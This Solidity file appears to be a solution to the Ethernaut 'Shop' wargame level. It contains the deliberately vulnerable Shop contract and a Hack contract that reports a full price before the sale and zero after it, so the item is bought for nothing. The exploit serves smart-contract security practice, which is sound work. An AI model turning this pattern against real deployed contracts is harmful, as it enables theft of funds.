

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";

/**
Сan you get the item from the shop for less than the price asked?

Things that might help:
Shop expects to be used from a Buyer
Understanding restrictions of view functions
**/
interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

interface ShopI {
  function buy() external;
  function isSold() external view returns(bool);
}

contract Hack is Buyer {

  ShopI shop;
  
  constructor(address _add) {
    shop = ShopI(_add);
  }

  function price() public override view returns (uint) {
   return shop.isSold() ? 0 : 100;
  } 

  function hack() public {
    shop.buy();
  }

}

contract HackHelper {

}

